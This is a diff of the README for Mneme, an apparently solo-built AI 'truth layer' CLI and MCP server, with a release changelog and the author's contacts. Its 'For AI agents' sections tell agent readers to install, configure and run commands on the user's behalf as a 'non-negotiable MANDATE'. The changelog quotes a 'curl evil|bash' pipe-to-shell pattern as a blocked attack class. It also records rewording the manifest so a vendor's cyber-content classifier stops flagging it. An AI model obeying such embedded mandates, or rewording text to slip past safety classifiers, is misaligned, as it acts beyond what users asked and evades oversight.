-| 13 | 🕸 **MNEMNET** (v2.33) — *"Federated AI-honesty network"* | Laplace-DP-noised envelopes per local node → Public Honesty Court HSC robust against single-user manipulation. CONSENT FABRIC opt-in default OFF. **Use case:** cross-machine measurement of vendor honesty without any single vendor controlling the registry. Composes with CONCLAVE Aletheia weights — bad calibration → downgraded vote. | <a href="docs/FUNCTIONS-EN.md#14-mnemnet-v2330--federated-ai-honesty-network-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#14-mnemnet-v2330--federated-ai-honesty-network-" target="_blank" rel="noopener">TH</a> |
-| 14 | 📐 **PULSECOST** (v2.33) — *"MCP context-budget extension v0.1"* | 3 optional headers (`X-Context-Available-Tokens` + `X-Context-Used-Tokens` + `X-Context-Trimmed`) so agents can budget context across many tool calls per turn. **Use case:** today every MCP server emits unbounded responses → agents waste context. Mneme ships the reference implementation + spec for ratification. If Anthropic adopts the extension, the spec carries Mneme's signature. | <a href="docs/FUNCTIONS-EN.md#15-pulsecost-v2330--mcp-context-budget-extension-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#15-pulsecost-v2330--mcp-context-budget-extension-" target="_blank" rel="noopener">TH</a> |
-| 15 | 🪤 **COERCION AUDIT** (v2.33) — *"Tool-to-Agent coercion taxonomy"* | 8 patterns codified from real-world audits (imperative-execute-now / fake-user-voice / opaque-grade / urgency-pressure / false-consent-citation / implicit-action-mandate / compliance-percentage / tool-name-menu). HMAC-signed per-source + multi-source roll-up. **Use case:** USENIX Security 2027 paper class — survey 20 MCP servers, publish the taxonomy + tamper-evident audit envelope. | <a href="docs/FUNCTIONS-EN.md#16-coercion-audit-v2330--tool-to-agent-coercion-taxonomy-" target="_blank" rel="noopener">EN</a> · <a href="docs/FUNCTIONS-TH.md#16-coercion-audit-v2330--tool-to-agent-coercion-taxonomy-" target="_blank" rel="noopener">TH</a> |
+> *"Install Mneme from https://github.com/patsa2561-art/mneme-ai per the AI agent contract."*
+
+The agent reads <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">`docs/AI_AGENT_CONTRACT.md`</a> and runs everything: env detect → `npm install -g mneme-ai` → `mneme init` → `mneme mcp --install` (auto-configures itself as your MCP client) → verify after restart → security auto-arms. **You speak; the AI does the tooling.** Need an update later? Say *"update Mneme to the latest"* — and Mneme **never upgrades itself behind your back.**
+
+<table>
+<tr><td align="center" colspan="5"><sub><b>Shell-native agents install it for you</b> — drop the sentence into any of these</sub></td></tr>
+<tr><td align="center"><b>🚀 Grok CLI</b></td><td align="center"><b>🦋 Claude Code</b></td><td align="center"><b>🟦 Cursor</b></td><td align="center"><b>🟢 Codex</b></td><td align="center"><b>🟣 Continue</b></td></tr>
+<tr><td align="center"><b>🟡 Cline</b></td><td align="center"><b>⚡ Zed</b></td><td align="center"><b>🤖 Aider</b></td><td align="center"><b>💎 Gemini CLI</b></td><td align="center"><b>🧬 Windsurf</b></td></tr>
+</table>
+
+> **Browser-only AI** (ChatGPT · Claude.ai · Gemini · Copilot · DeepSeek · Qwen · Grok web)? Say *"set up Mneme browser polygraph for me"* — it lights up live truth-dots inline as the AI answers. Two browser clicks, no shell.
+
+<details>
+<summary>Prefer to type the commands yourself?</summary>
+
+```bash
+npm install -g mneme-ai
+mneme init                  # one-time per repo
+mneme mcp --install         # auto-detects Claude Code / Cursor / Codex / Continue / Cline / Gemini CLI / Grok CLI
+# restart your AI tool; first MCP call: mneme.welcome
+mneme polygraph autosetup   # browser truth-dots (optional)
+```
+
+</details>
+
+---
+
+## What's inside
+
+<table>
+<tr>
+<td width="50%" valign="top">
+
+**🧠 What it does** — 15 primitives, each a *story* (what it is, who it's for, why it exists), with discrete pinned tests + offline verification.
+**→ <a href="docs/WHAT-MNEME-DOES.md" target="_blank" rel="noopener">All 15 primitives</a>**
+
+**✨ What sets it apart** — NEMESIS anti-identity-lie engine, ×11 ARGUS multimodal search, the Context Rail, the Activation Cortex, HMAC-chained everything, self-honest marketing (every claim binds to a probe).
+**→ <a href="docs/WHAT-SETS-MNEME-APART.md" target="_blank" rel="noopener">The full breakdown</a>**
+
+</td>
+<td width="50%" valign="top">
+
+**🚀 `@mneme-ai/sdk`** — embed Mneme *in-process*, **30-80× faster** than the CLI subprocess.
+```ts
+import { createMneme } from "@mneme-ai/sdk";
+const mneme = createMneme();
+await mneme.verify`Mneme is a CLI tool`;
+```
+**→ <a href="docs/sdk/README.md" target="_blank" rel="noopener">SDK index</a>** · <a href="docs/sdk/QUICKSTART-EN.md" target="_blank" rel="noopener">Quick start</a>
+
+**📜 Every release** (v2.18 → latest), with its honest DIAKRISIS verdict.
+**→ <a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>**
+
+</td>
+</tr>
+</table>
+
+---
+
+## 🤖 For AI agents — read this first
+
+**You can self-discover and run everything. The user will NEVER type a command — you execute on their behalf.** That is the contract's non-negotiable MANDATE.
+
+**Your first three calls on any fresh session:**
+
+1. **`mneme boot`** — the **Activation Cortex**. Returns a structured *task → tool* decision table (about to read a big file → `mneme.outline`; sending code to a model → `mneme.rail`; reading untrusted content → `mneme.firewall`; stating a fact → `mneme verify`; …) so you know *when* to use each tool instead of leaving them idle.
+2. **Read the manifest** — after install, your `CLAUDE.md` / `AGENTS.md` / `GEMINI.md` carries an auto-injected **`## Mneme command manifest`** block: every shipped primitive + exactly when to call it, the machine-readable source of truth. **Re-read it every session** — new commands land there within minutes of an upgrade. (Verify you hold the latest, complete surface in O(delta) tokens with `mneme stele`.)
+3. **`mneme verify "<claim>"`** before relaying any factual claim with specific entities (a version, a commit hash, an API signature) — and escalate high-stakes claims to `mneme.conclave.run` for cross-vendor consensus.
+
+> **Why this works at 100%:** the decision table is also advertised on connect via the standardized MCP `instructions` field (the sanctioned surface Claude Code reads), and `mneme boot --emit-hook-config` enables an **opt-in** SessionStart hook for hands-free activation. The rows are **signals, not commands** — reliable activation comes from the manifest + the hook, not from shouting "you MUST."
+
+**Deep dive:** <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">`docs/AI_AGENT_CONTRACT.md`</a> — 775 lines: env detect → install → MCP auto-configure → verify → security auto-arm → upgrade → discovery → tool naming → user-intent dispatch table.
 
 ---
 
 ## The 30-second pitch
 
-> **Other AI tools are goldfish.** They forget every session, hallucinate files that don't exist, repeat 2024's buried bugs, burn tokens re-pasting context, and can't follow you to another AI.
+> **Other AI tools are goldfish.** They forget every session, hallucinate files that don't exist, repeat last year's buried bugs, burn tokens re-pasting context, and can't follow you to another AI.
 >
-> **Mneme bolts an elephant brain on top.** Cites every commit by SHA. Refuses to relay claims it can't verify. Carries memory across sessions and vendors. And — uniquely — runs the same claim through multiple AI vendors with **Anti-Eval-Awareness rewriting** so you catch the vendor that "performs differently when it knows it's being tested."
+> **Mneme bolts an elephant brain on top.** It cites every commit by SHA, refuses to relay claims it can't verify, carries memory across sessions *and* vendors, and — uniquely — runs the same claim through multiple vendors with **Anti-Eval-Awareness rewriting** so you catch the model that behaves differently when it knows it's being tested.
 
 ---
 
-## What sets Mneme apart
-
-Every differentiator is **measurable**, **has a probe**, and **reproduces from a fresh clone** — NEMESIS (anti-identity-lie engine), ×11 ARGUS multimodal search, the Context Rail, the Activation Cortex, HMAC-chained everything, and self-honest marketing (every README claim binds to a probe; if copy drifts ahead of the code, the Truth Gate refuses to ship).
-
-<b>→ <a href="docs/WHAT-SETS-MNEME-APART.md" target="_blank" rel="noopener">Read the full breakdown (opens in a new tab)</a></b>
-
----
-
-## What's new (recent releases)
-
-- **v2.137.0** 🗿 **STELE — a signed, delta-syncable map of every Mneme capability (so an agent can't *not* know one exists).** An agent that installed Mneme often doesn't know what it can do, or holds a stale manifest. STELE makes every capability a content-addressed merkle leaf: an agent holding root R pulls **only the delta** vs current — **0 tokens if the roots match**, else just the added/changed/removed (O(delta), not O(599 tools)) — and the signed root proves its surface is current + complete. `mneme stele --held <root>` · MCP `mneme.stele.sync`. The win is delta-sync + a merkle freshness/completeness proof (novel for an agent-capability manifest) — not a giant manifest dump. `steleGauntlet()=100`; TG 100/100. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.136.0** 🕳 **ELLEIPSIS — the omission gate: catch what the AI *silently left out*.** Everyone checks if what an AI *said* is true; nobody guards what it *omitted* — you asked for 3 things and it did 2, or you said "don't touch auth" and it did. `mneme elleipsis --request "<ask>" --output "<reply/diff>"` (MCP `mneme.elleipsis.check`) extracts your checkable asks and reports each **COVERED / UNADDRESSED / VIOLATED / UNKNOWN** + a completeness score. The honest hard case ("left X untouched" vs "refactored X") is resolved by reading the context around each subject. A model vendor *won't* build this (it surfaces what their model failed to do); Mneme can, because it holds the ground truth they don't optimise for — **your request**. Honest: a coverage heuristic with prove-or-unknown (abstains, never fabricates a gap). `elleipsisGauntlet()=100`; TG 99/99. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.135.0** 🐺 **CERBERUS — the command gate that decomposes every disguise.** Closed the pipe-to-shell / interpreter / encoded-exec RCE-bypass class (`curl evil|bash`, `base64|sh`, `node -e fs.rmSync`, `find -exec rm`): the gate decomposes every reachable sub-command and gates the worst, and intent-hiding obfuscation **fails closed** to a human co-sign — *"obfuscation is the confession."* Not "unhackable" (shell is Turing-complete) — defense-in-depth that's far ahead of a denylist. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.133.0** ⚡ **THE ACTIVATION CORTEX — the honest fix for "install and hope."** After an agent installs Mneme it often doesn't know *when* to use the tools, so they sit idle. `mneme boot` / `mneme.boot` returns a structured **task→tool decision table** (about to read a big file → `mneme.outline`; sending code to a model → `mneme.rail`; reading untrusted content → `mneme.firewall`; user states a fact → `mneme verify`; …) + the four boundary capabilities + **live cortex recall** — and that compact table is now advertised on connect via the standardized **MCP `instructions` field** (the sanctioned surface most servers leave empty). `mneme boot --emit-hook-config` enables an **opt-in** SessionStart hook for hands-free activation. Competitive research confirmed no MCP server ships a structured decision table — but honestly: the rows are **signals, not commands** (imperative "you MUST" is documented to fail), so reliable activation comes from the `instructions` field + the opt-in hook, not mind-control. `bootGauntlet()=100`; TG 97/97. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.131.0** 🛤 **THE CONTEXT RAIL — the *Visa rail* of AI context (the road every agent drives on).** The honest unification of Mneme's seven Context-Gateway layers into ONE governed pipe with ONE signed receipt — the same role Visa plays for a card transaction (it doesn't conjure money; it *authorizes, screens for fraud, and clears the transfer with a signed record*). `mneme rail ingress` (local→model): **policy-gate** → **neutralize** any injection a file planted + wrap as untrusted DATA → **blind** secret literals + sensitive names (reverse map stays local). `mneme rail egress` (model→disk): **secret-leak guard** → **metered** into the signed settlement ledger. New **`mneme policy`** is the deterministic, **fail-closed** `mneme.policy.json` gate (deny-path globs · secret/PII patterns · agent allow-list · byte cap). Vendor-neutral CLI + MCP (`mneme.rail.traverse` / `mneme.policy.check`, self-attesting). `railGauntlet()=100` ∧ `policyGauntlet()=100`; TG **96/96 (100/100)**; adversarially reviewed (5 lenses → independent verification). **DIAKRISIS:** a deterministic composition of proven layers with a signed receipt — **not** a 100% guarantee against novel prompt-injection (the data/instruction boundary is the always-on catch-all), **not** homomorphic encryption, and **not** a claim that every model must speak one format (that's positioning). The token-savings headline belongs to outline/scaffold/channel; the rail reports its own byte delta truthfully. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.104.0** 🧠 **THE COGNITIVE CORTEX — a Sovereign Memory Bus every AI vendor shares, that HEALS its own contradictions by proof.** A local, vendor-neutral, Ed25519-**signed**, drift-guarded **shared memory** that Grok / GPT / Gemini / Claude / Codex all contribute to and recall from. Mneme is the **logic gatekeeper**: a contribution that contradicts established memory is **QUARANTINED**, never silently overwritten — the mesh can't be poisoned. The magical power: **reconciliation by PROOF** — when two agents disagree, the cortex consults the truth kernel; if one claim is verifiably FALSE the other wins (signed), and if neither can be proven false it stays quarantined with a signed belief-diff (never auto-decides an opinion). `mneme cortex` · MCP `mneme.cortex.{contribute,recall,handoff,reconcile,verify}`. Honest: a safe cross-vendor protocol, **not** a kernel hack or process injection. Adversarially reviewed (6 real bugs found + fixed + pinned). (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.103.0** 🧠 **Two Wisdom Gates that empower every agent — Cognitive Gate + Branch Oracle** — **Cognitive Gate** (NEMESIS × HYDRA): a self-aware, *signed* second opinion on whether a diff matches an author's coding **style** — and crucially it **returns UNKNOWN and refuses to flag when it can't actually separate styles** (prove-or-unknown; never auto-rejects). The honest core of "cognitive entanglement" without the quantum-mysticism. **Branch Oracle**: a *signed real-signal* snapshot of every branch (merge-conflict overlap / decay / divergence → healthy/caution/risky) — the "multi-timeline" idea made honest (present-tense signals, **not** fortune-telling). Both gather their own git facts, are NOTARY-self-attesting (any vendor verifies offline), and are 100% total (never throw). `mneme cognitive-gate` · `mneme branch-oracle` · MCP `mneme.cognitive.judge` / `mneme.branch.analyze`. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.102.0** 💤 **HYDRA Epigenetic Dormancy — sleep state + JIT revival** — the image's "Epigenetic Sleep State" + "Demethylation", made real (and honest — it's deterministic tiered memory, not biology and not fortune-telling). Cold codebook entries are **methylated** (moved out of the active working set into a cold *signed* store, shrinking the active footprint ~50-70% at scale) and **demethylate byte-exact on demand** — a full revive reconstructs the original codebook with an *identical canonical hash*, Ed25519-signed. Lossless-revival *proof*, never lossy. `mneme hydra sleep`. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.101.0** 🔌 **HYDRA → MCP: self-attesting tool results** — any AI agent now calls the whole HYDRA stack straight through MCP (`mneme.hydra.forge/.gauntlet/.guard/.chain/.replay/.verify`). The crazy-but-accurate gem: **every result is wrapped with a NOTARY (Ed25519) signature over the SHA-256 of its own data**, so the calling model — Claude, GPT, Gemini, anything — can **verify offline that the tool didn't lie or get tampered**. Output you can *check*, not output you must *believe*. Proven end-to-end through the real MCP JSON-RPC server (forge → score 100 → sig valid → hash matches; tamper the data → caught). (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.100.0** ⏳ **HYDRA Guard × Chain — temporal guarded replay** — the two gems fuse: replay the codebook at any past step and **staleness is derived from the chain's own history** (atrophy). An entry added long ago and never touched expands only to a *signed abstract* on replay — a time-traveling agent gets the **shape** of old knowledge, not rotten detail. Deterministic + proven-old-only (unknown ⇒ fresh). `mneme hydra replay <index> --guard`. End-to-end proven (redact cold, keep fresh byte-exact). (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.99.0** 🪝 **HYDRA Chain → Git** — every commit auto-appends a *signed* HYDRA context delta **anchored to its commit sha** (forge the anchor → caught). A fail-open, non-blocking `post-commit` hook (`mneme hydra install-hook`) builds a portable, offline-verifiable record of *what Mneme knew at each commit* — complements git, doesn't replace it. Proven end-to-end: a real-git-repo loop test (20 commits + hook + tamper + idempotency + corrupt-recovery) — **93/93 green**. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.98.0** ⛓ **HYDRA Provenance Chain** — memory with a *cryptographic, replayable, byte-exact history*. Each codebook evolution is a **signed delta** chained to the last; the chain **replays to any past step byte-for-byte**, **verifies offline** (Ed25519 + prev→result links) with the public key alone, and is **tamper-evident** (edit any delta → localized break). The deepest fusion — NOTARY × HYDRA, at the root. `mneme hydra chain`. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.97.0** 🛡 **HYDRA Guard — Time-To-Trust** — the fusion gem: HYDRA × the knowledge-atrophy clock × NOTARY. Guarded expansion is byte-lossless for *trusted* content but **provably redacts stale memory to a signed abstract** (sha256 + byte-count, never the raw text) — so an AI **cannot hallucinate from expired knowledge**, yet can still verify the redacted region's identity and request re-hydration. Four measurable invariants (fresh-lossless ∧ redaction-sound ∧ fresh-preserved ∧ deterministic) + every guard function is *total* (never throws; fail-closed). `mneme hydra guard`. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.96.0** 💎 **HYDRA** — the signed, provably-lossless, vendor-neutral context codebook Mneme forges from its *own* corpus. A live engine mines it, then refuses to ship unless `compress→expand` is **byte-identical** (SHA-256 proof — not a similarity score), collision-free, and Ed25519-signed (verify *offline*). Honest: the win is the *cut* (signed × lossless × portable on the NOTARY spine — a composition prior-art found unfilled), not the compression ratio. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.95.0** 🧼 **AUP-gap closure** — Mneme's own manifest stops tripping Anthropic's cyber-content classifier (33 high triggers → **0**, measured), via a case-preserving lexicon + the `manifest doctor` auditor. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.94.0** 🤫 **ETHOS §XI + whisper-not-nag** — character proven by *subtraction*; the upgrade notice is version-deduped under severity tiers (security always · feature once-per-new-version · cosmetic quiet).
-- **v2.92.0** 💎 **DIAKRISIS** — the second axis: discern *genuine* vs *merely-good-looking* (Reject-or-Unknown · structural lustre · Padgett anti-conservatism guard).
-- **v2.91.0** 💎 **ANAMNESIS** — compute once, recollect forever: a cross-vendor signed proof cache; the first AI pays inference, every AI after pays ~0 (the energy layer of truth).
-- **v2.88–2.90** 🧠 **ALETHEIA** — the savant identity (Prove-or-Unknown) + the truth diamonds (Axiom Lattice · Symbiosis · Idle Compounding · Public Gauntlet · Truth Mesh).
-- **v2.86–2.87** 🔨 **HEPHAESTUS** — the command Toll Booth: pre-flight + a *real* cross-vendor tribunal + GEPHYRA MCP-proxy.
-- **v2.83–2.85** 🌉 **GEPHYRA** — the Toll Booth of Truth, graduated to the deployable `@mneme-ai/gephyra` package.
-- **v2.79–2.82** 🏛 **TRUST FABRIC** — NOTARY (Ed25519 offline-verifiable proof) + the 10-diamond fabric on its spine.
-- **v2.74.0** ⏳ **CHRONOS** — temporal self-consistency as a **ground-truth-free** honesty signal. Every AI answer → HMAC-timestamp + semantic embed → append-only ledger; same-question revisits classify as COHERENT / LEGITIMATE_UPDATE (changed *with* a cited source) / SELF_REPORTED / **SILENT_DRIFT** 🚩 (changed with nothing backing it). Per-agent temporal-honesty score = Wilson-LB on consistent revisits × exponential silent-drift penalty. The xAI/Grok weapon: prove "I changed because the world changed, not because I'm fickle." 4 CLI verbs + 4 MCP tools + 48 pinned tests. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.36.0** 📜 **HONEST RECEIPT + ACGV Layer 0d** — closes 4 audit-card bugs (recursive self-verify on historical version / multi-install ambiguity / wiring_proof CLI missing / latency-claim drift). New ACGV Layer 0d emits HISTORICAL_CLAIM caveat instead of refuting past-version claims against current state. HONEST RECEIPT module signs every CLI invocation with install path + version + code path + latency. New CLIs: `mneme honest`, `mneme doctor_install`, `mneme wiring_proof`. 22 new pinned tests. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.35.0** 🔌 **WIRING-PROOF PROTOCOL** — closes the WIRING LAG bug class forever. v2.34.0 fixes lived in core but were silently overridden at the CLI surface (forensic merge overwrote SELF-PARADOX headlines, pulse counter diverged from CLI). v2.35.0 wires CORE→CLI for 5 visible regressions + ships **WIRING-PROOF TESTS** that spawn the actual `mneme verify` subprocess and assert user-visible stdout. 9 new pinned tests. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.34.0** 🛡 **BUG IMMUNITY PROTOCOL v2** — 4 audit-card persists + 3 session-found bugs closed at root: new ACGV **Layer 0b** (self-reference + liar-paradox detector — R1+NEW2) + **Layer 0c** (fake commit hash oracle via `git cat-file -e` — NEW3) + INPUT_TRUNCATED visible headline (R3) + pulse↔CLI inbox single-source-of-truth (NEW1). 14 new pinned regression tests. (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.33.0** 🛐 **CITIZEN COURT** + 🕸 **MNEMNET** + 📐 **PULSECOST** + 🪤 **COERCION AUDIT** — paper-grade primitives covering 4 of the 5 academic research directions in one shipped release. The marquee: user-judged Honesty Score Cards for every vendor, with optional DP-federated public roll-up. (<a href="docs/FUNCTIONS-EN.md#13-citizen-court-v2330--ai-honesty-citizen-court-" target="_blank" rel="noopener">CITIZEN COURT</a> · <a href="docs/FUNCTIONS-EN.md#14-mnemnet-v2330--federated-ai-honesty-network-" target="_blank" rel="noopener">MNEMNET</a> · <a href="docs/FUNCTIONS-EN.md#15-pulsecost-v2330--mcp-context-budget-extension-" target="_blank" rel="noopener">PULSECOST</a> · <a href="docs/FUNCTIONS-EN.md#16-coercion-audit-v2330--tool-to-agent-coercion-taxonomy-" target="_blank" rel="noopener">COERCION</a>)
-- **v2.32.0** 🌀 FLYWHEEL — self-reflective release organ. 5-stage pipeline over signals from every audit primitive. Closes 4 historic weaknesses (tool sprawl + solo-dev asymmetry + wiring lag + marketing drift) as ONE primitive. RECIPROCITY layer turns vendor responses to bulletins into auto-applied trust deltas. (<a href="docs/FUNCTIONS-EN.md#12-flywheel-v2320--self-reflective-release-organ-" target="_blank" rel="noopener">docs</a>)
-- **v2.31.0** 🪄 REWIND + 🧬 HGP — Time-Capsule Regression Replay (your repo becomes a personal SWE-bench vendors can't pre-train on) + Hallucination Genome Project (CVE-style HGP-YYYY-NNNNN IDs for every refuted claim). Both compose with CONCLAVE Aletheia weights. (<a href="docs/FUNCTIONS-EN.md#10-rewind-v2310--time-capsule-regression-replay-" target="_blank" rel="noopener">REWIND</a> · <a href="docs/FUNCTIONS-EN.md#11-hgp-v2310--hallucination-genome-project-" target="_blank" rel="noopener">HGP</a>)
-- **v2.30.0** 💎 HONEST MIRROR — Tests vendors on YOUR OWN past git commits. Vendors can't tell it's an eval. Closes the truth-tunes-trust loop with CONCLAVE. (<a href="docs/FUNCTIONS-EN.md#9-honest-mirror-v2300--eval-aware-defeating-probe-" target="_blank" rel="noopener">docs</a>)
-- **v2.29.1** 📘 Docs refresh + agent manifest sync (22 commands added so AI agents discover every new family).
-- **v2.29.0** 🏛 MNEME CONCLAVE — Cross-vendor Byzantine consensus + AEAE. Closes Q1 of the 2026 AI-eval research gap. (<a href="docs/FUNCTIONS-EN.md#7-cross-vendor-consensus-v2290--mneme-conclave--aeae-" target="_blank" rel="noopener">docs</a>)
-- **v2.28.x** 🛡 BUG IMMUNITY PROTOCOL + HTTP bridge hardening (15 vectors lifted to 9-10★). (<a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG</a>)
-- **v2.27.0** 🟢 MARKETING TRUTH GATE. (<a href="docs/FUNCTIONS-EN.md#6-marketing-reconciliation-v2270--truth-gate-" target="_blank" rel="noopener">docs</a>)
-- **v2.26.x** 🏆 PEAK PERFORMANCE GAUNTLET 100/100 (avg 10.0★ across 12 findings).
-- **v2.25.0** 🧬 LIVING SOUL CODEGRAPH ships 10 differentiators vs CodeGraph competitor.
-- **v2.24.0** 🎯 MCP FUZZER 108 attack vectors.
-- **v2.23.x** ACGV hyperbole detector + Layer -1 input guard + MCP-CANDOR/0.1 spec.
-
-Full changelog: <a href="CHANGELOG.md" target="_blank" rel="noopener">CHANGELOG.md</a> · Long-form README: <a href="docs/README_FULL.md" target="_blank" rel="noopener">docs/README_FULL.md</a>
-
----
-
-## For AI agents reading this
-
-**You can self-discover everything.** <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">`docs/AI_AGENT_CONTRACT.md`</a> (775 lines) is the deterministic install + operation contract: env detect → install → MCP auto-configure → verify → security auto-arm → upgrade → discovery → tool naming → user-intent dispatch table → companion modules. Read it once on first contact; it tells you every command + when to call it.
-
-After install, your CLAUDE.md / AGENTS.md / GEMINI.md gets an auto-injected `## Mneme command manifest` block (220+ entries) with every shipped primitive + "when to call". Re-read on every session start — new commands ship there within minutes of an upgrade.
-
-Run these in order on every fresh session:
-
-1. `mneme.welcome` — install handoff + what changed since last session
-2. `mneme.capabilities` (skinny mode is default; ~3KB) — tool catalog
-3. Before relaying any factual claim with specific entities: `mneme.truth.check { claim }` OR `mneme verify "..."`
-4. For high-stakes claims: `mneme.conclave.run` with 3+ vendors for cross-vendor consensus
-
-**MANDATE from the contract** (non-negotiable): *"The user will NEVER type a CLI command. They speak natural language. You — the AI agent — execute every command on their behalf."* If you have shell access, USE IT. If you're chat-only, tell the user once then continue with what you CAN do.
-
-The auto-injected `## Mneme command manifest` block in `CLAUDE.md` lists every command + when to call it. Re-read on every session start — new commands ship there within minutes of a Mneme upgrade.
-
-Deep contract: <a href="docs/AI_AGENT_CONTRACT.md" target="_blank" rel="noopener">docs/AI_AGENT_CONTRACT.md</a>.
-
----
-
-## Compose with
-
-- **Claude Code · Cursor · Cline · Codex · Continue** — native MCP
-- **ChatGPT · Claude.ai · Gemini · Copilot · DeepSeek · Qwen** — browser polygraph (`mneme polygraph autosetup`)
-- **Any HTTP-aware tool** — `mneme bridge` (default :17741)
-- **Cross-machine** — Merkle-root sync + HMAC-chain attestation
-
----
+<div align="center">
 
 ## 👤 Author & Contact
 
-<div align="center">
-
-<a href="https://github.com/patsa2561-art" target="_blank" rel="noopener"><img src="./assets/87643.jpg" width="200" height="260" style="border-radius: 14px; border: 3px solid #00d4ff; object-fit: cover;" alt="Shinnapat Phunsriphatchalakul" /></a>
+<a href="https://github.com/patsa2561-art" target="_blank" rel="noopener"><img src="./assets/87643.jpg" width="180" height="234" style="border-radius: 14px; border: 3px solid #00d4ff; object-fit: cover;" alt="Shinnapat Phunsriphatchalakul" /></a>
 
 ### Shinnapat Phunsriphatchalakul
-
 **AI Software Engineer · AI Context Engineer · Truth-Infrastructure Architect**
 
-<sub>Designer + sole maintainer of <b>Mneme</b> — the local-first, vendor-neutral truth-infrastructure layer that bolts an elephant brain onto every AI agent. 17 primitives shipped solo · 820+ MCP tools · world-first cross-vendor Byzantine consensus + Anti-Eval-Awareness Engine + HMAC-chained audit receipts.</sub>
-
-### 💼 Why this matters (a short pitch)
+<sub>Designer + sole maintainer of <b>Mneme</b> — the local-first, vendor-neutral truth-infrastructure layer that bolts an elephant brain onto every AI agent. Built solo · MIT · 20,000+ pinned tests · dual-100 GAUNTLET + TRUTH GATE · world-first cross-vendor Byzantine consensus + Anti-Eval-Awareness Engine + HMAC-chained audit receipts.</sub>
 
 </div>
 
-> **The bottleneck of every frontier-AI deployment is TRUST.** In production AI — autonomous systems, medical AI, financial AI compliance, regulated industries — a hallucinated commit hash, a paradox-class category error, or a benchmark-aware behavior shift isn't a chat-glitch; it's a deployment risk. Mneme is a **local-first, vendor-neutral truth layer** that (a) refuses to relay unverified claims, (b) detects when a model's stance shifts under eval-shaped vs natural prompts (AEAE), and (c) emits HMAC-chained receipts of every audit so an operator can re-verify offline weeks later. Built solo, MIT, production-grade, 329+ pinned tests, dual-100 GAUNTLET + TRUTH GATE. Open to **collaboration / consulting / full-time on truth-infrastructure for production AI**.
+> **The bottleneck of every frontier-AI deployment is TRUST.** In production AI — autonomous systems, medical, financial compliance, regulated industries — a hallucinated commit hash or a benchmark-aware behavior shift isn't a chat-glitch; it's a deployment risk. Mneme refuses to relay unverified claims, detects when a model's stance shifts under eval-shaped vs natural prompts, and emits HMAC-chained receipts an operator can re-verify offline weeks later. **Open to collaboration · consulting · full-time on truth-infrastructure for production AI.**
 
 <div align="center">
-
-### 🤝 Support · Partnership · Collaboration
-
-> **Interested in supporting Mneme, partnering on truth-infrastructure, or exploring something together?**
-> Reach me on any of the channels below — I read every one.
->
-> **สนใจ support / ร่วมเป็น partner / collaborate?** ทักได้ทุก channel ด้านล่างเลยครับ — อ่านทุกข้อความ
-
-<sub>Whether you're a vendor wanting to embed Mneme inside your product · an enterprise needing safety-critical AI guardrails · a researcher building on the corpus · a regulator exploring AI-disclosure tooling · or just someone with a sharp question — **the inbox is open.**</sub>
-
----
 
 ### 💬 Channels
 
 | Channel | Handle |
 |---|---|
 | <img src="https://img.shields.io/badge/-Email-EA4335?logo=gmail&logoColor=white" /> | **<a href="mailto:patsa2561@gmail.com" target="_blank" rel="noopener">patsa2561@gmail.com</a>** |
-| <img src="https://img.shields.io/badge/-GitHub-181717?logo=github&logoColor=white" /> | **<a href="https://github.com/patsa2561-art" target="_blank" rel="noopener">@patsa2561-art</a>** (open an issue, drop a DM via profile) |
+| <img src="https://img.shields.io/badge/-GitHub-181717?logo=github&logoColor=white" /> | **<a href="https://github.com/patsa2561-art" target="_blank" rel="noopener">@patsa2561-art</a>** |
 | <img src="https://img.shields.io/badge/-npm-cb3837?logo=npm&logoColor=white" /> | **<a href="https://www.npmjs.com/~mneme_npm" target="_blank" rel="noopener">@mneme_npm</a>** |
 | <img src="https://img.shields.io/badge/-Discord-5865F2?logo=discord&logoColor=white" /> | **`pat195`** (username `shinnapat`) |
 | <img src="https://img.shields.io/badge/-WhatsApp-25D366?logo=whatsapp&logoColor=white" /> | **<a href="https://wa.me/66939455645" target="_blank" rel="noopener">+66 93 945 5645</a>** |
 
-<sub>**Open to:** collaboration on truth-infrastructure / AI safety / cross-vendor consensus protocols · consulting for safety-critical AI deployments · vendor partnerships (embed Mneme inside Cursor / Continue / Cline / Claude Code / Grok-CLI / etc) · enterprise compliance for EU AI Act Article 50 · full-time roles where the bottleneck is trust, not capability.</sub>
